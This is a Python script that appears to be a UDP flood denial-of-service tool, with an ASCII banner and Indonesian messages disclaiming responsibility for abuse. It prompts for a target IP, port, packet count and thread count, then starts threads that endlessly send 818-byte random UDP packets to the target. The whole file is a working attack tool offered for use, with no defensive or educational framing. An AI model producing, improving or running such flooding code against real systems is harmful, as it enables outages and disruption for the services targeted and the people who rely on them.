import random
import socket
import threading
import os,sys
import time

os.system("clear")
time.sleep(2)
print('''\033[1;31;40m
░█████╗░██████╗░  
██╔══██╗██╔══██╗  
███████║██████╔╝  
██╔══██║██╔══██╗  
██║░░██║██║░░██║  
╚═╝░░╚═╝╚═╝░░╚═╝  
███╗░░██╗██╗██╗░░██╗  
████╗░██║██║██║░░██║  
██╔██╗██║██║███████║  
██║╚████║██║██╔══██║  
██║░╚███║██║██║░░██║  
╚═╝░░╚══╝╚═╝╚═╝░░╚═╝  
██████╗░███████╗██╗░░██╗
██╔══██╗██╔════╝██║░██╔╝
██║░░██║█████╗░░█████═╝░
██║░░██║██╔══╝░░██╔═██╗░
██████╔╝███████╗██║░╚██╗
╚═════╝░╚══════╝╚═╝░░╚═╝''')
print("\033[94m")
print("-----------------------------")
print("ABUSE? TANGUNG SENDIRI HEHEE ")
print("YG RENAME BESOK MATI BY ANAWH")
print("-----------------------------")
print("INI TOOLS GAK JANJI TEMBUS YA INI BY AR COMUNITY JIKA ADA MASALAH")
print("KLO ADA MASALAH PM @! Siapa#2010")
print("BY ANAWH")
ip = str(input("IP TARGET :"))
port = int(input("PORT TARGET :"))
choice = str(input("GAS DDOS(y/n) :"))
times = int(input("PAKET :"))
threads = int(input("THREAD :"))

os.system("clear")
def run():
        data = random._urandom(818)
        i = random.choice(("[•]","[•]","[•]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print(i +" PAKET DARI AR TIBA!!!")
                except:
                        print("[X] MISI PAKET NIH DARI AR!!!")

def run2():
        data = random._urandom(818)
        i = random.choice(("[•]","[•]","[•]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +" PAKET DARI AR TIBA!!!")
                except:
                        s.close()
                        print("[X] MISI PAKET NIH DARI AR!!!")

def run3():
        data = random._urandom(818)
        i = random.choice(("[•]","[•]","[•]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +" PAKET DARI AR TIBA!!!")
                except:
                        s.close()
                        print("[X] MISI PAKET NIH DARI AR!!!")

for y in range(threads):
        if choice == 'y':
                th = threading.Thread(target = run)
                th.start()
                th = threading.Thread(target = run2)
                th.start()
        else:
                th = threading.Thread(target = run3)
                th.start()